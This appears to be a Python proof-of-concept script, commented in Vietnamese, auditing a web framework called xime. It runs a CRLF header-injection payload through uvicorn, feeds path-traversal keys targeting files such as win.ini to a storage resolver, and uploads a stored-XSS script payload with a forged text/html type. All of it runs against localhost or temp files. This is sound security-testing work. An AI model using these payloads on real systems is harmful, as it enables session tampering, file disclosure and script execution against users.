"""PoC vòng 2: CRLF qua uvicorn thật, traversal localfs, chuỗi XSS lưu trữ."""
import sys, asyncio, os, socket, tempfile, threading, time, shutil
sys.path.insert(0, r"d:/code/xime/xime framework")


# ---------------------------------------------------------------------------
# PoC 6 - CRLF trong Content-Disposition có ra tới dây không (uvicorn THẬT)?
# ---------------------------------------------------------------------------
def poc_6_crlf_on_the_wire():
    print("=" * 72)
    print("PoC 6 - CRLF trong filename qua uvicorn thật (h11 và httptools)")
    print("=" * 72)
    import uvicorn
    from starlette.applications import Starlette
    from starlette.routing import Route
    from starlette.responses import StreamingResponse

    async def endpoint(request):
        async def body():
            yield b"data"
        # Đúng dòng framework dựng: adapters/web/files/_download.py:108
        filename = "a.pdf\r\nSet-Cookie: pwned=1"
        return StreamingResponse(
            body(),
            headers={"Content-Disposition": f'inline; filename="{filename}"'},
        )

    app = Starlette(routes=[Route("/f", endpoint)])

    for impl in ("h11", "httptools"):
        try:
            __import__(impl)
        except ImportError:
            print(f"  {impl}: chưa cài, bỏ qua")
            continue

        sock = socket.socket()
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()

        config = uvicorn.Config(app, host="127.0.0.1", port=port,
                                http=impl, log_level="critical")
        server = uvicorn.Server(config)
        t = threading.Thread(target=server.run, daemon=True)
        t.start()
        for _ in range(100):
            if server.started:
                break
            time.sleep(0.05)

        raw = b""
        try:
            c = socket.create_connection(("127.0.0.1", port), timeout=5)
            c.sendall(b"GET /f HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
            while True:
                b_ = c.recv(4096)
                if not b_:
                    break
                raw += b_
            c.close()
        except Exception as exc:
            raw = f"LỖI: {exc}".encode()
        server.should_exit = True
        t.join(timeout=5)

        head = raw.split(b"\r\n\r\n", 1)[0]
        print(f"  --- {impl} ---")
        for line in head.split(b"\r\n"):
            print(f"      {line!r}")
        if b"Set-Cookie: pwned=1" in head:
            print(f"  => THỦNG với {impl}: header Set-Cookie giả đã ra tới dây\n")
        else:
            print(f"  => {impl} chặn được (hoặc trả lỗi)\n")


# ---------------------------------------------------------------------------
# PoC 7 - LocalFileStorage có chặn được khóa gạch chéo ngược trên Windows?
# ---------------------------------------------------------------------------
def poc_7_localfs_traversal():
    print("=" * 72)
    print("PoC 7 - LocalFileStorage._resolve với khóa dị dạng")
    print("=" * 72)
    from xime.starters.localfs._storage import LocalFileStorage
    from xime.starters.storage import StorageError

    root = tempfile.mkdtemp(prefix="xime-poc-")
    outside = os.path.join(os.path.dirname(root), "NGOAI-ROOT.txt")
    with open(outside, "w") as f:
        f.write("bi mat ngoai root")

    class FakeConfig:
        def get(self, key, default=None):
            return root if key == "storage.local.root" else default

    st = LocalFileStorage(FakeConfig())
    keys = [
        "ok/file.txt",
        "../NGOAI-ROOT.txt",
        "..\\NGOAI-ROOT.txt",
        "..\\..\\Windows\\win.ini",
        "C:\\Windows\\win.ini",
        "a\x00.png",
        "....//....//NGOAI-ROOT.txt",
    ]
    for k in keys:
        try:
            p = st._resolve(k)
            inside = os.path.commonpath([str(p), root]) == root
            mark = "trong root" if inside else "!!! NGOÀI ROOT !!!"
            print(f"  CHẤP NHẬN  {k!r:45} -> {p}  [{mark}]")
        except StorageError as exc:
            print(f"  từ chối    {k!r:45} -> {exc}")
        except Exception as exc:
            print(f"  lỗi khác   {k!r:45} -> {type(exc).__name__}: {exc}")

    shutil.rmtree(root, ignore_errors=True)
    try:
        os.remove(outside)
    except OSError:
        pass
    print()


# ---------------------------------------------------------------------------
# PoC 8 - Chuỗi XSS lưu trữ: Content-Type của kẻ tấn công đi từ upload -> download
# ---------------------------------------------------------------------------
def poc_8_stored_xss_chain():
    print("=" * 72)
    print("PoC 8 - Content-Type kẻ tấn công khai lúc upload có quay ra lúc tải về?")
    print("=" * 72)
    from starlette.applications import Starlette
    from starlette.routing import Route
    from starlette.testclient import TestClient
    from xime.adapters.web.files import save_upload, stream_object
    from xime.starters.storage import StorageStat

    class MemoryStorage:
        """Giả lập backend LƯU content_type (đúng như S3FileStorage.stat())."""
        def __init__(self):
            self.blobs, self.types = {}, {}

        async def put_stream(self, key, chunks, *, content_type=None):
            buf = b""
            async for c in chunks:
                buf += c
            self.blobs[key] = buf
            self.types[key] = content_type

        async def stat(self, key):
            if key not in self.blobs:
                return None
            return StorageStat(size=len(self.blobs[key]),
                               content_type=self.types[key], etag="e1")

        def open_stream(self, key, *, offset=0, length=None):
            async def gen():
                data = self.blobs[key]
                yield data[offset: offset + length if length else None]
            return gen()

    storage = MemoryStorage()

    async def upload(request):
        form = await request.form()
        await save_upload(storage, "u/1", form["file"])
        from starlette.responses import PlainTextResponse
        return PlainTextResponse("saved")

    async def download(request):
        return await stream_object(storage, "u/1", request=request)

    app = Starlette(routes=[
        Route("/upload", upload, methods=["POST"]),
        Route("/download", download),
    ])
    client = TestClient(app)

    payload = b"<script>alert(document.domain)</script>"
    r = client.post(
        "/upload",
        files={"file": ("innocent.png", payload, "text/html")},  # Content-Type do KẺ TẤN CÔNG khai
    )
    print(f"  upload -> {r.status_code}; content_type đã lưu = {storage.types['u/1']!r}")

    r = client.get("/download")
    ct = r.headers.get("content-type")
    print(f"  download -> {r.status_code}; Content-Type trả về = {ct!r}")
    print(f"  X-Content-Type-Options   = {r.headers.get('x-content-type-options')!r}")
    print(f"  Content-Disposition      = {r.headers.get('content-disposition')!r}")
    print(f"  thân phản hồi            = {r.text!r}")
    if ct and ct.startswith("text/html"):
        print("  => THỦNG: trình duyệt sẽ CHẠY script này trên origin của app (XSS lưu trữ)\n")
    else:
        print("  => không khai thác được\n")


if __name__ == "__main__":
    poc_6_crlf_on_the_wire()
    poc_7_localfs_traversal()
    poc_8_stored_xss_chain()
